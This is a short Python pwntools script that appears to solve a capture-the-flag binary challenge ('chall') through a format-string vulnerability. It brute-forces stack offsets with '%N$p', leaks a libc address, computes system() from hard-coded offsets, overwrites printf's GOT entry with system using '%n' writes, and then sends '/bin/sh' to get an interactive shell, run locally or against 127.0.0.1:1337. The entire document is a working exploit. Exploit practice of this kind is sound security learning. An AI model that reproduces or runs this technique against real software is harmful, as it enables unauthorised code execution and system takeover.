from pwn import *

def offset_finder():
  for x in range (1, 50):
        p = process("./chall")
        
        print "Offset number {}".format(x)

        payload = ""
        # payload += "A" * 8
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        # print p.recv()
        stack_value = p.recvline()[:-1]
        print stack_value
            
        p.close()

def exploit(p):
  context.arch = 'amd64'
  binary = ELF("./chall")
  printf_got = binary.got['printf']
  # gdb.attach(p, '''
  #             b *0x0000000000401282
  #             c
  #           ''')

  p.sendline("%19$p")
  libc_leak = int(p.recvline()[:-1], 16) - 243
  log.info("Libc leak: {}".format(hex(libc_leak)))
  libc_base = libc_leak - 0x026fc0
  log.info("Libc base: {}".format(hex(libc_base)))
  libc_system = libc_base + 0x055410
  log.info("Libc system: {}".format(hex(libc_system)))
  log.info("Printf got: {}".format(hex(printf_got)))
  overwrite1 = libc_system & 0xffff
  log.info("First overwrite: {}".format(hex(overwrite1)))
  overwrite2 = (libc_system & 0xffff0000) >> 16
  log.info("Second overwrite: {}".format(hex(overwrite2)))
  overwrite3 = libc_system >> 32
  log.info("Third overwrite: {}".format(hex(overwrite3)))

  payload = ''
  payload += '%{}c%13$lln'.format(overwrite1)
  payload += '%{}c%14$hn'.format(overwrite3 - overwrite1 if overwrite3 > overwrite1 else overwrite2 - overwrite1)
  payload += '%{}c%15$hna'.format(overwrite2 - overwrite3 if overwrite2 > overwrite3 else overwrite3 - overwrite2)
  payload += p64(printf_got)
  payload += p64(printf_got + 4)
  payload += p64(printf_got + 2)

  print len(payload)
  # gdb.attach(p, '''
  #             b *0x00000000004012c1
  #             c
  #           ''')
  p.sendline(payload)
  p.sendline('/bin/sh\x00')

  p.interactive()

if __name__ == "__main__":
  if len(sys.argv) < 2:
    log.info("Argument needed!")
    log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
  elif sys.argv[1] == "local":
    p = process("./chall")
    exploit(p)
  elif sys.argv[1] == "remote":
    p = remote("127.0.0.1", 1337)
    exploit(p)
  else:
    sys.exit(0)